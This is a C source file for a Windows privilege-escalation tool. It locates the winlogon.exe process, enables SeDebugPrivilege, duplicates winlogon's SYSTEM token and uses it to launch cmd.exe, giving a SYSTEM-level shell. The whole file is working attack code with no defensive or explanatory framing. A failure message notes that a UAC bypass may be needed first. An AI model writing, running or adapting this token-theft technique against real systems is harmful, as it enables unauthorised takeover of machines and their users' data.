#include<windows.h>
#include<stdio.h>
#include<tlhelp32.h>
DWORD get_the_process_id()
{
    PROCESSENTRY32 entry;
    entry.dwSize=sizeof(PROCESSENTRY32);
    HANDLE snapshot=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    if(Process32First(snapshot,&entry)==TRUE)
    {
        while(Process32Next(snapshot,&entry)==TRUE)
        {
            if(strcmp(entry.szExeFile,"winlogon.exe")==0)
            {
                return entry.th32ProcessID;
            }
        }
    }
    return 0;

}
void enable_debug_privilage(HANDLE token,LPCTSTR privilage)
{
    TOKEN_PRIVILEGES tp;
    LUID luid;
    if(!LookupPrivilegeValue(NULL,SE_DEBUG_NAME,&luid))
    {
        printf("lookup privilage value error %lu",GetLastError());
    }
    tp.PrivilegeCount=1;
    tp.Privileges[0].Luid=luid;
    tp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
    if(!AdjustTokenPrivileges(token,FALSE,&tp,sizeof(TOKEN_PRIVILEGES),(PTOKEN_PRIVILEGES)NULL,(PDWORD)NULL))
    {
        printf("adjust token error %lu",GetLastError());
    }
    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

    {
          printf("The token does not have the specified privilege and need a UAC bypass first \n");
          return FALSE;
    }
    else{printf("token has been adjusted for se_debug_enable privilage.CONGRATS\n");}

}

void get_that_pesky_token(DWORD pid)
{
    HANDLE winlogon;
    printf("\nopening process id %lu",pid);
    winlogon=OpenProcess(PROCESS_QUERY_INFORMATION,TRUE,pid);
    if(!winlogon)
    {
        printf("\ncant open PID:%lu because %lu",pid,GetLastError());
    }
    HANDLE ptoken;
    if(!OpenProcessToken(winlogon,TOKEN_ASSIGN_PRIMARY|TOKEN_DUPLICATE|TOKEN_IMPERSONATE|TOKEN_QUERY,&ptoken))
    {
        printf("\nopen process token error %lu",GetLastError());
    }
    SECURITY_IMPERSONATION_LEVEL seimp=SecurityImpersonation;
    TOKEN_TYPE tk=TokenPrimary;
    HANDLE pnewtoken;
    if(!DuplicateTokenEx(ptoken,MAXIMUM_ALLOWED,NULL,seimp,tk,&pnewtoken))
    {
            printf("\nduplicate token error %lu",GetLastError());
    }
    else
    {
        printf("\nTOKEN HAS BEEN DUPLICATED");
    }
    STARTUPINFO si = {};
    PROCESS_INFORMATION pi= {};
    if(!CreateProcessWithTokenW(pnewtoken,LOGON_NETCREDENTIALS_ONLY,L"C:\\Windows\\System32\\cmd.exe", NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
    {
        printf("cant create the process due to %lu",GetLastError());
    }
}

int main()
{
    DWORD PID;
    PID=get_the_process_id();
    printf("GOT THE PROCESS ID : %lu\n",PID);
    HANDLE current_process=GetCurrentProcess();
    HANDLE current_token;
    OpenProcessToken(current_process,TOKEN_ALL_ACCESS,&current_token);
    enable_debug_privilage(current_token,SE_DEBUG_NAME);
    get_that_pesky_token(PID);


}
